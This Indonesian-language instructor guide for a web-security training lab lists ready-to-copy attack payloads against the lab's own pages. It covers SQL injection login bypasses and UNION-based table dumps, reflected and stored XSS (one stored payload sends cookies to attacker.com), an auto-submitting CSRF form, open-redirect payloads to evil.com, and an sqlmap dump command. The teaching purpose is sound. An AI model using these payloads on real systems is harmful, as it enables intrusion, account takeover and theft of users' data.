# 🛡️ ACT LAB :: THE ULTIMATE INSTRUCTOR BIBLE (SEMINAR EDITION)

Dokumen ini adalah panduan lengkap untuk demonstrasi eksploitasi di ACT LAB. Gunakan payload di bawah ini untuk menunjukkan berbagai teknik serangan dari level Basic hingga Advanced.

---

## 1. SQL INJECTION (SQLi) :: AUTHENTICATION BYPASS
**Target:** Login Gateway (`/lab/sqli-login`)
**Tujuan:** Masuk sebagai Admin tanpa mengetahui password.

### ⚡ Daftar Payload (Direct Copy)
*   **Basic Bypass:** `admin' --`
*   **Logic Bypass:** `' OR '1'='1' --`
*   **Double Quote Bypass:** `admin" --`
*   **No Whitespace (Nyeleneh):** `admin'/**/--`
*   **Always True Logic:** `' OR 1=1 LIMIT 1 --`

### 🛠️ Metodologi Manual
1.  **Analisis:** Masukkan `'` (single quote) di field password. Tunjukkan error SQL ke audiens.
2.  **Penjelasan:** Jelaskan bahwa karakter `'` memutus query asli server.
3.  **Eksploitasi:** Gunakan `--` (komentar SQL) untuk mematikan sisa query (pengecekan password), sehingga server hanya mengecek username.

---

## 2. SQL INJECTION (SQLi) :: UNION-BASED EXTRACTION
**Target:** Search Engine (`/lab/sqli-union`)
**Tujuan:** Mencuri data sensitif (Flag/Password) dari tabel lain.

### ⚡ Step-by-Step Payload
1.  **Cek Jumlah Kolom:**
    *   `' ORDER BY 8 --` (Membuktikan ada 8 kolom)
2.  **Cek Kolom yang Muncul di Layar:**
    *   `' UNION SELECT 1,2,3,4,5,6,7,8 --` (Tunjukkan angka mana yang muncul di UI)
3.  **Dumping Tabel Users:**
    *   `' UNION SELECT 1,username,password,email,5,6,7,8 FROM users --`
4.  **Dumping Flag (Target Utama):**
    *   `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges --`

---

## 3. XSS (REFLECTED) :: CLIENT-SIDE ATTACK
**Target:** Search Bar (`/lab/xss-reflected`)
**Tujuan:** Menjalankan script di browser korban via URL.

### ⚡ Daftar Payload Nyeleneh
*   **Classic:** `<script>alert('PWNED')</script>`
*   **Image Error (Sering di GitHub):** `<img src=x onerror=alert(1)>`
*   **SVG Animation:** `<svg/onload=alert(document.domain)>`
*   **HTML5 Details:** `<details open ontoggle=alert('ACT_LAB')>`
*   **Marquee Fun:** `<marquee><h1>SYSTEM HIJACKED BY ACT LAB</h1></marquee>`

### 🛠️ Metodologi Manual
1.  Tunjukkan bagaimana input di URL `?q=` langsung muncul di halaman tanpa difilter.
2.  Jelaskan bahwa browser menganggap input kita sebagai kode perintah, bukan teks biasa.

---

## 4. XSS (STORED) :: PERSISTENT MALWARE
**Target:** Global Guestbook (`/lab/xss-stored`)
**Tujuan:** Menanam script permanen di database.

### ⚡ Daftar Payload Pro
*   **Persistent Popup:** `<script>alert('This message is stored in DB!')</script>`
*   **Cookie Stealer Simulation:** `<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>`
*   **UI Deface:** `<style>body{background:blue !important;}</style><h1>HACKED</h1>`

---

## 5. IDOR :: INSECURE OBJECT REFERENCE
**Target:** Profile Page (`/lab/idor`)
**Tujuan:** Melihat data rahasia Admin.

### ⚡ Eksploitasi Cepat
1.  Buka profil Anda sendiri, lihat di input ID (misal: `999`).
2.  Ganti ID secara manual menjadi `1`.
3.  **Hasil:** Profil Admin dan Flag IDOR akan muncul di Bio.

---

## 6. CSRF (CROSS-SITE REQUEST FORGERY)
**Target:** Profile Settings (`/lab/csrf`)
**Tujuan:** Mengganti email korban tanpa mereka sadari.

### ⚡ Payload Exploit (Simulasi HTML)
Bapak bisa jelaskan bahwa attacker membuat file `attack.html` berisi kode ini:
```html
<form action="http://act-lab.app/api/profile" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com" />
  <input type="hidden" name="bio" value="PWNED BY CSRF" />
</form>
<script>document.forms[0].submit();</script>
```

---

## 7. OPEN REDIRECT :: PHISHING GATEWAY
**Target:** Navigation Redirect (`/lab/redirect`)
**Tujuan:** Mengirim user ke situs berbahaya.

### ⚡ Payload Bypass
*   **Simple:** `?url=https://google.com`
*   **Protocol Relative:** `?url=//bing.com`
*   **Double Slash:** `?url=////evil.com`

---

## 🛰️ TOOLBOX INSTRUKTUR
*   **Burp Suite:** Gunakan untuk menunjukkan "Raw HTTP Request" (sangat disukai audiens pro).
*   **SQLmap:** Tunjukkan cara otomatisasi SQLi Union.
    *   Command: `sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dump`

**ACT LAB :: EMPOWERING CYBER SECURITY**
